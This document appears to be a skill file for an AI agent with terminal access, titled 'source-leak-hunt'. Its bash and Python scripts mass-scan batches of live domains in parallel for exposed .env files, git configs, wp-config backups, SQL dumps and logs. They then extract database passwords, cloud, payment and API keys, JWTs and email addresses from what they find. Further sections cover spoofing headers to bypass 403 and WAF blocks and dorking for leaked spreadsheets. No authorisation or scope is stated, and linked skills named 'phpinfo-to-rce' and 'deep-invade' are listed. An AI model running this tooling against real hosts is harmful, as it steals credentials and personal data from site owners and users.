---
name: source-leak-hunt
description: "Mass-scan live hosts for exposed sensitive files (.env, .git, wp-config backups, logs, dumps, phpinfo) with content-based verification, then extend into parameter discovery, URL categorization, WAF bypass, and historical recovery. Absorbs the former web-enumeration skill."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, grep
metadata:
  tags: [recon, source-leak, exposure, secrets, wordpress]
  category: recon
  related_skills:
    - wp-mass-recon
    - js-secrets-extraction
    - error-log-mining
    - phpinfo-to-rce
    - deep-invade
---

# Source Leak Hunt Skill

Mass scanning for exposed sensitive files (`.env`, `.git/config`, `wp-config.php.bak`, `debug.log`, `backup.sql`, `phpinfo.php`, `Dockerfile`, etc.) with content-based false positive filtering. Source leaks are the second most common finding (~7% of targets) after WordPress user enumeration.

## When to Use

- After `skill_view(name='wp-mass-recon')` confirms a target is alive.
- Broad scanning across a batch of domains.
- When probing for credential exposure that enables deeper access.
- Complementing `skill_view(name='js-secrets-extraction')` for client-side secrets.

## Prerequisites

- `terminal` with curl.
- List of live URLs (output from httpx or wp-mass-recon Phase 1).
- Persistence: output directory at `$OUTDIR/leaks/`.

## How to Run

```bash
# Quick scan single target (20 paths)
TARGET="https://example.com"
for path in .env .git/config wp-config.php.bak debug.log backup.sql info.php phpinfo.php \
  .env.backup .env.local .env.production wp-config.php~ .git/HEAD .backup.sql \
  docker-compose.yml Dockerfile .DS_Store robots.txt sitemap.xml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$TARGET/$path")
  [[ "$code" == "200" ]] && echo "HTTP 200: $TARGET/$path"
  sleep 0.2
done
```

## Quick Reference

| Path | What It Exposes | Severity |
|------|----------------|----------|
| `.env` | DB creds, API keys, app secrets | Critical |
| `wp-config.php.bak` | MySQL root password, salts | Critical |
| `.git/config` | Repository URL, credentials | High |
| `debug.log` | PHP errors, server paths, SQL queries | High |
| `backup.sql` | Full database dump | Critical |
| `info.php` / `phpinfo.php` | PHP config, disable_functions, server env | High |
| `docker-compose.yml` | Service architecture, env vars | Medium |
| `Dockerfile` | Build config, exposed ports | Low |
| `.env.backup` / `.env.local` | Same as .env, alternate names | Critical |
| `wp-config.php~` | Vim swap of wp-config | Critical |
| `.DS_Store` | Directory listing (macOS) | Low |
| `error_log` | PHP error log (can be multi-MB, full of paths/queries) | High |

## Procedure

### Step 1 — Parallel Mass Scan

```bash
#!/bin/bash
URLS_FILE="$1"   # One URL per line
OUTDIR="$OUTDIR/leaks"
mkdir -p "$OUTDIR"

PATHS=(
  ".env"
  ".git/config"
  "wp-config.php.bak"
  "debug.log"
  "backup.sql"
  "info.php"
  "phpinfo.php"
  ".env.backup"
  ".env.local"
  ".env.production"
  "wp-config.php~"
  ".git/HEAD"
  "docker-compose.yml"
  "Dockerfile"
  ".DS_Store"
  "robots.txt"
  "sitemap.xml"
  "error_log"
  "wp-content/debug.log"
  ".backup.sql"
)

# Content verification patterns (avoids SPA catch-all false positives)
declare -A PATTERNS
PATTERNS[".env"]='DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN'
PATTERNS["wp-config.php.bak"]='DB_NAME|DB_PASSWORD|AUTH_KEY'
PATTERNS[".git/config"]='\[core\]'
PATTERNS["debug.log"]='PHP|ERROR|WARNING|Stack trace'
PATTERNS["backup.sql"]='CREATE TABLE|INSERT INTO|DROP TABLE'
PATTERNS["info.php"]='PHP Version|phpinfo'
PATTERNS["phpinfo.php"]='PHP Version|phpinfo'
PATTERNS[".env.backup"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.local"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.production"]='DB_|APP_|_KEY|_SECRET'
PATTERNS["wp-config.php~"]='DB_NAME|DB_PASSWORD'
PATTERNS["error_log"]='PHP|ERROR|Stack trace'

scan_target() {
  local url="$1"
  local domain
  domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')

  for path in "${PATHS[@]}"; do
    local full_url="${url}/${path}"
    local code
    code=$(curl -sk -o /tmp/leak_check_$$.tmp -w "%{http_code}" --max-time 5 --connect-timeout 5 "$full_url" 2>/dev/null)

    if [[ "$code" == "200" ]]; then
      local content
      content=$(head -c 2000 /tmp/leak_check_$$.tmp 2>/dev/null)
      local pattern="${PATTERNS[$path]}"

      if [[ -n "$pattern" ]] && echo "$content" | grep -qiE "$pattern"; then
        echo "[LEAK] $full_url (VERIFIED: $path)"
        echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        cp /tmp/leak_check_$$.tmp "$OUTDIR/${domain}_${path//\//_}.content" 2>/dev/null
      elif [[ -z "$pattern" ]]; then
        # No pattern check — just log HTTP 200 (e.g., robots.txt)
        local size=$(wc -c < /tmp/leak_check_$$.tmp)
        if [[ "$size" -gt 50 ]]; then
          echo "[INFO] $full_url (HTTP 200, ${size} bytes)"
          echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        fi
      fi
    fi
    sleep 0.3
  done
  rm -f /tmp/leak_check_$$.tmp
}

export -f scan_target
export OUTDIR
export PATHS

# Run 30 parallel workers
cat "$URLS_FILE" | xargs -P 30 -I {} bash -c 'scan_target "{}"'

echo "[+] Done. Results in $OUTDIR/"
```

### Step 2 — Extract Credentials from Leaked Files

```bash
# From .env files
grep -rhE '(DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN|SECRET)=' $OUTDIR/leaks/*.env*.content 2>/dev/null | sort -u

# From wp-config backups
grep -rhE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' $OUTDIR/leaks/*wp-config* 2>/dev/null

# From .git/config
grep -rh 'url = ' $OUTDIR/leaks/*.git_config.content 2>/dev/null

# From SQL dumps
grep -rhE 'CREATE TABLE|INSERT INTO' $OUTDIR/leaks/*backup* $OUTDIR/leaks/*.sql* 2>/dev/null | head -20
```

### Step 3 — Find Targets with Multiple Leaks (Deep-Dive Candidates)

```bash
for f in $OUTDIR/leaks/*_leaks.txt; do
  count=$(wc -l < "$f")
  [[ "$count" -ge 3 ]] && echo "$(basename "$f" _leaks.txt): $count leaks"
done | sort -t: -k2 -rn
```

---

## Extended Enumeration (merged from web-enumeration)

The sections below extend the leak scan into broader web enumeration: credential extraction from `.env` bodies, framework log mining, cache detection, parameter and URL-category mapping, WAF bypass, and historical recovery. Virtual-host enumeration is owned by `vhost-enumeration`; path-traversal bypasses are owned by `hunt-lfi` and `401-403-bypass-techniques`.

See `references/batch-probe-methodology.md` for the bounded batch-probe template that pairs with this section.

## Automatic .env Credential Extraction

```python
import re
env_content = requests.get("http://target/.env", timeout=10).text
patterns = {
    "DB_HOST": r"DB_HOST=(.+)",
    "DB_DATABASE": r"DB_DATABASE=(.+)",
    "DB_USERNAME": r"DB_USERNAME=(.+)",
    "DB_PASSWORD": r"DB_PASSWORD=(.+)",
    "APP_KEY": r"APP_KEY=(.+)",
    "APP_URL": r"APP_URL=(.+)",
    "REDIS_HOST": r"REDIS_HOST=(.+)",
    "REDIS_PASSWORD": r"REDIS_PASSWORD=(.+)",
    "MAIL_USERNAME": r"MAIL_USERNAME=(.+)",
    "MAIL_PASSWORD": r"MAIL_PASSWORD=(.+)",
    "AWS_KEY": r"AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY)=(.+)",
    "SENDGRID": r"SENDGRID_API_KEY=(.+)",
    "SENTRY": r"SENTRY_DSN=(.+)",
    "JWT_SECRET": r"JWT_SECRET=(.+)",
    "OAUTH": r"OAUTH_(?:CLIENT_ID|CLIENT_SECRET)=(.+)",
    "FIREBASE": r"FIREBASE_.+=(.+)",
    "OPENAI": r"OPENAI_API_KEY=(.+)",
    "STRIPE": r"STRIPE_(?:KEY|SECRET)=(.+)",
}
for name, pattern in patterns.items():
    matches = re.findall(pattern, env_content)
    for m in matches:
        print(f"KEY {name}: {m.strip()}")
```

## Log Data Extraction

```python
log = requests.get("http://target/storage/logs/laravel.log", timeout=30).text
emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', log))
for e in sorted(emails):
    if not e.endswith(('.png','.jpg','.svg','.css','.js','.ico','.woff')):
        print(f"EMAIL {e}")
sqls = re.findall(r'(?:SQL:|Executing query:|query:)\s*(.*?)(?:\\\\|$)', log)
for s in set(sqls):
    if len(s) > 10:
        print(f"QUERY {s[:200]}")
jwts = re.findall(r'eyJ[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}', log)
for j in set(jwts):
    print(f"JWT {j[:80]}...")
paths_found = set(re.findall(r'(?:in |at )/(?:[a-zA-Z0-9_\-./]+\.(?:php|js|ts|py|rb))', log))
for p in sorted(paths_found):
    print(f"PATH {p}")
```

## Varnish Cache Detection

```bash
# Detect cache headers
curl --max-time 30 --connect-timeout 10 -sI "https://TARGET/" | grep -iE "(age|x-cache|via|server)"
# Via: 1.1 varnish = Varnish
# X-Cache: Hit from cloudfront = AWS CloudFront
# Cf-Cache-Status: HIT = Cloudflare
# Varnish Extreme TTL (32 days):
curl --max-time 30 --connect-timeout 10 -sI "https://TARGET/" | grep -iE "age:|max-age|x-cache"
```

### Phase 6 — Parameter Discovery

Find hidden parameters on known endpoints:

```bash
# paramspider — finds parameters from Wayback data
paramspider -d target.com -o params.txt

# arjun — discovers hidden parameters via HTTP response comparison
arjun -i backend_urls.txt -o arjun_params.json
arjun -u https://target.com/endpoint -m POST

# x8 — hidden parameter discovery
x8 -u "https://target.com/endpoint" -o x8_params.txt

# Prepare URLs for parameter fuzzing
cat all_urls.txt | grep "=" | qsreplace "FUZZ" | anew param_fuzz.txt
# Deduplicate by parameter name
cat all_urls.txt | grep "=" | sed "s/=[^&]*/=/g" | sort -u > params_clean.txt
```

### Phase 7 — URL Category Extraction

Categorize discovered URLs by sensitivity to prioritize testing:

```bash
# JavaScript files (for secret hunting)
cat all_urls.txt | grep -iE '\.js(\?|$)' | grep -iv '\.json' | sort -u > js_urls.txt

# API endpoints
cat all_urls.txt | grep -Ei '\.(json|xml|graphql)(\?|$)' > api_urls.txt

# Backend scripts
cat all_urls.txt | grep -Ei '\.(php|asp|aspx|jsp|cfm|cgi)(\?|$)' > backend_urls.txt

# Auth/login flows
cat all_urls.txt | grep -Ei "login|signin|auth|oauth|reset|password" > auth_urls.txt

# Admin panels
cat all_urls.txt | grep -Ei "admin|dashboard|internal|manage|panel" > admin_urls.txt

# File upload/download
cat all_urls.txt | grep -Ei "upload|file|download|image|media" > upload_urls.txt

# IDOR candidates
cat all_urls.txt | grep -Ei "[0-9]{3,}" > idor_candidates.txt

# Open redirect candidates
cat all_urls.txt | grep -Ei "redirect|callback|goto|return|dest=|r=|u=|url=" > redirect_urls.txt

# Everything interesting in one shot
cat all_urls.txt | urinteresting
```

### Phase 8 — WAF & 403 Bypass

```bash
# IP header spoofing
ffuf -u https://target.com/blocked-path \
  -w 403_bypass_headers.txt \
  -H "FUZZ" \
  -mc 200,301,302

# Common bypass headers
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/admin" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-Host: 127.0.0.1" \
  -H "X-Custom-IP-Authorization: 127.0.0.1" \
  -H "X-Original-URL: /admin" \
  -H "X-Rewrite-URL: /admin"

# HTTP method switching
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com/admin" -o /dev/null -w "%{http_code}"
  echo
done

# Path override techniques
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/anything" -H "X-Original-URL: /admin"
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/anything" -H "X-Rewrite-URL: /admin"
```

### Phase 9 — Historical Page Recovery & Robots.txt History

```bash
# Robots.txt history via roboxtractor
cat alive_subs.txt | roboxtractor -m 1 -wb

# Recover 404 pages via Wayback Machine
waybackurls https://target.com | grep "webstat\|/old/\|/v1/\|/deprecated" > old_pages.txt

# For each old page, re-crawl linked resources
gospider -s https://target.com -a -r \
  | grep -oE 'https?://[^[:space:]"]+' \
  | grep "/old-path/"

# Google Sheets leak hunting
# site:*.target.com intext:"docs.google.com/spreadsheets"
# site:docs.google.com/spreadsheets "target.com" "password"

# GitHub endpoints: find internal API paths in repos
github-endpoints -q -k -d target.com -t $GITHUB_TOKEN
```

## Pitfalls

- **SPA catch-all false positives over 70% of results without filtering.** Single-page apps return HTTP 200 with index.html for any path. Content verification is mandatory.
- **CloudFront/S3 error pages.** Some CDNs return 200 with an XML error body for missing files. Check content type and body.
- **Truncated content on large files.** `error_log` files can be 1.7MB+. Fetch in chunks or use `curl -r 0-5000` for sampling.
- **git/HEAD false positive.** Some themes/setups have `.git/HEAD` returning 200 with a legitimate git hash. Verify `.git/config` first.
- **Parked/for-sale domains return HTTP 200 for every path.** Generic parking pages serve content for /.env, /.git/config, /info.php, etc. with no error handling — every path returns 200 with the same landing page. Detect these by checking if multiple unrelated paths return identical content (same body hash, same `<title>`, or same keyword like "for sale" or "parked"). Add early-exit: if /robots.txt and /.env both return 200 with near-identical HTML, mark domain as parked and skip further source-leak checks.

## Verification

- Every `.env` leak MUST contain at least one of: `DB_`, `APP_`, `_KEY`, `_SECRET`, `PASSWORD`, `TOKEN`.
- Every `wp-config.php.bak` leak MUST contain `DB_NAME` and `DB_PASSWORD`.
- Every `.git/config` leak MUST contain `[core]` section header.
- Every SQL backup MUST contain DDL (`CREATE TABLE`) or DML (`INSERT INTO`) statements.
- Log all verified leaks with timestamp and HTTP response size.

### Phase 6 — Backup File Discovery

```bash
# bfac — multi-level backup file detection
bfac --url https://target.com \
  --detection-technique all \
  --level 3 \
  --exclude-status-codes 404,500

# Wayback Machine — historical sensitive files
waybackurls https://target.com | grep -iE \
  "\.(xls|xlsx|csv|sql|db|bak|backup|old|tar\.gz|tgz|zip|7z|rar|pdf|pem|key|crt|env|json|yml|yaml|conf|config|git|htpasswd|log|dump|DS_Store)" \
  | sort -u > sensitive_wayback.txt

# Check which are still accessible
cat sensitive_wayback.txt | httpx -silent -mc 200 -o accessible_sensitive.txt

# Common backup patterns to probe
for ext in bak old backup zip tar.gz tgz sql dump; do
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/backup.$ext" | head -1
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/site.$ext" | head -1
  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/target.$ext" | head -1
  sleep 0.3
done
```

### Phase 7 — Google Services Leak Dorking

```bash
# Google Sheets — internal spreadsheets often left public
# Manual search:
# site:docs.google.com/spreadsheets "target.com"
# site:docs.google.com/spreadsheets "@target.com"
# site:docs.google.com/spreadsheets "password" "target.com"

# Google Drive files
# site:drive.google.com "target.com" "confidential"

# Firebase/Firestore URLs in public search results
# site:firebaseio.com "target.com"
# site:firestore.googleapis.com "target-app"

# GCP buckets
# site:storage.googleapis.com "target"
# site:storage.cloud.google.com "target"
```
